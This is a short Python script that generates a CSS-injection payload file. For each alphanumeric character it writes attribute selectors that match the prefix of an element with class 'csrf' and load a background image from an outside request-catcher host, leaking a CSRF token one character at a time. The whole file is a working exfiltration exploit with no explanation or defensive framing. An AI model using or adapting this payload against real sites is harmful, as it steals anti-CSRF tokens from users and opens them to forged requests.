import string

prefix = ""
css = ""

for c in filter(str.isalnum, string.printable):
    payload = f"{prefix}{c}"
    css += f"""
.csrf[value^="{payload}"] {{
    --starts-with-{payload}:url("https://toto.requestcatcher.com/{payload}");
}}
input{{
   background: var(--starts-with-{payload},none);
}}
"""

with open("style.css", "w") as f:
    f.write(css)
